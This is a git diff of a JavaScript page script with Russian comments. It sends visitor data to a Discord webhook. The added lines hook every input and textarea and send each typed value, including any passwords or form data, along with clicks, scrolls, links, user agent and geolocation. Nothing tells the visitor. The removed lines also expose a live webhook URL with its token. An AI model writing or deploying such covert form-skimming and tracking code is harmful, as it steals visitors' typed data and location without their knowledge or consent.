@@ -1,3 +1,5 @@
+// scripts.js
+
 // Функция для получения информации о пользователе
 function getUserInfo() {
     const userAgent = navigator.userAgent; // Получаем информацию о браузере/устройстве
@@ -15,8 +17,8 @@ function sendToDiscord(data) {
 
     const message = {
         content: `Новый визит:
-- Телефон: ${data.phoneInfo}
-- Время входа: ${data.visitTime}`
+        - Телефон: ${data.phoneInfo}
+        - Время входа: ${data.visitTime}`
     };
 
     fetch(webhookURL, {
@@ -44,6 +46,54 @@ window.onload = () => {
     sendToDiscord(userData);
 };
 
+// Отслеживание кликов по всем кнопкам на странице
+document.querySelectorAll('button').forEach(button => {
+    button.addEventListener('click', (event) => {
+        const actionData = {
+            action: 'Клик по кнопке',
+            buttonText: event.target.innerText
+        };
+        sendToDiscord(actionData);
+    });
+});
+
+// Отслеживание скроллинга
+window.addEventListener('scroll', () => {
+    const scrollData = {
+        action: 'Прокрутка страницы',
+        scrollY: window.scrollY
+    };
+    sendToDiscord(scrollData);
+});
+
+// Отслеживание кликов по ссылкам
+document.querySelectorAll('a').forEach(link => {
+    link.addEventListener('click', (event) => {
+        const linkData = {
+            action: 'Клик по ссылке',
+            linkHref: event.target.href
+        };
+        sendToDiscord(linkData);
+    });
+});
+
+// Отслеживание изменения ввода в текстовых полях (например, формы)
+document.querySelectorAll('input, textarea').forEach(input => {
+    input.addEventListener('input', (event) => {
+        const inputData = {
+            action: 'Изменение ввода',
+            inputType: event.target.type,
+            inputValue: event.target.value
+        };
+        sendToDiscord(inputData);
+    });
+});
+
+// Основная функция, вызываемая при нажатии на кнопку
+function handleClick() {
+    redirectToPage(); // Переход на первую страницу
+    setTimeout(redirectBack, 6000); // Через 6 секунд перенаправляем на вторую страницу
+}
 
 // Функция для перенаправления на первую страницу
 function redirectToPage() {
@@ -57,68 +107,61 @@ function redirectBack() {
     }, 6000);
 }
 
-// Основная функция, вызываемая при нажатии на кнопку
- const webhookUrl = "https://discord.com/api/webhooks/1299013641084866674/PKIfals7J4p1kYsUJCQesFHK06vZKKR_dL2T_cLvxFylqnsEweKVADcKz-N_Ej4yzNRv";
-
-        // Функция для получения местоположения пользователя
-        function getLocationAndSendToWebhook() {
-            if (navigator.geolocation) {
-                // Запрашиваем местоположение
-                navigator.geolocation.getCurrentPosition(sendLocationToWebhook, showError);
-            } else {
-                console.log("Геолокация не поддерживается этим браузером.");
-            }
-        }
-
-        // Функция для обработки успешного получения местоположения
-        function sendLocationToWebhook(position) {
-            // Получаем координаты
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-
-            // Формируем сообщение для отправки в Discord
-            const message = {
-                content: `Местоположение пользователя:\nШирота: ${latitude}\nДолгота: ${longitude}`
-            };
-
-            // Отправляем данные в вебхук Discord
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(message)
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Данные успешно отправлены в Discord:', data);
-            })
-            .catch((error) => {
-                console.error('Ошибка при отправке данных:', error);
-            });
-        }
-
-        // Функция для обработки ошибок получения местоположения
-        function showError(error) {
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    console.log("Пользователь отклонил запрос на доступ к геолокации.");
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    console.log("Информация о местоположении недоступна.");
-                    break;
-                case error.TIMEOUT:
-                    console.log("Превышено время ожидания запроса.");
-                    break;
-                case error.UNKNOWN_ERROR:
-                    console.log("Неизвестная ошибка.");
-                    break;
-            }
-        }
-
-        // Добавляем обработчик события для кнопки
-        document.getElementById("getLocationBtn").addEventListener("click", getLocationAndSendToWebhook);
-function handleClick() {
-    redirectToPage(); // Переход на первую страницу
-    setTimeout(redirectBack, 6000); // Через 6 секунд перенаправляем на вторую страницу
+// Функция для получения местоположения пользователя
+function getLocationAndSendToWebhook() {
+    if (navigator.geolocation) {
+        // Запрашиваем местоположение
+        navigator.geolocation.getCurrentPosition(sendLocationToWebhook, showError);
+    } else {
+        console.log("Геолокация не поддерживается этим браузером.");
+    }
 }
+
+// Функция для обработки успешного получения местоположения
+function sendLocationToWebhook(position) {
+    // Получаем координаты
+    const latitude = position.coords.latitude;
+    const longitude = position.coords.longitude;
+
+    // Формируем сообщение для отправки в Discord
+    const message = {
+        content: `Местоположение пользователя:\nШирота: ${latitude}\nДолгота: ${longitude}`
+    };
+
+    // Отправляем данные в вебхук Discord
+    fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(message)
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log('Данные успешно отправлены в Discord:', data);
+    })
+    .catch((error) => {
+        console.error('Ошибка при отправке данных:', error);
+    });
+}
+
+// Функция для обработки ошибок получения местоположения
+function showError(error) {
+    switch(error.code) {
+        case error.PERMISSION_DENIED:
+            console.log("Пользователь отклонил запрос на доступ к геолокации.");
+            break;
+        case error.POSITION_UNAVAILABLE:
+            console.log("Информация о местоположении недоступна.");
+            break;
+        case error.TIMEOUT:
+            console.log("Превышено время ожидания запроса.");
+            break;
+        case error.UNKNOWN_ERROR:
+            console.log("Неизвестная ошибка.");
+            break;
+    }
+}
+
+// Добавляем обработчик события для кнопки получения местоположения
+document.getElementById("getLocationBtn").addEventListener("click", getLocationAndSendToWebhook);
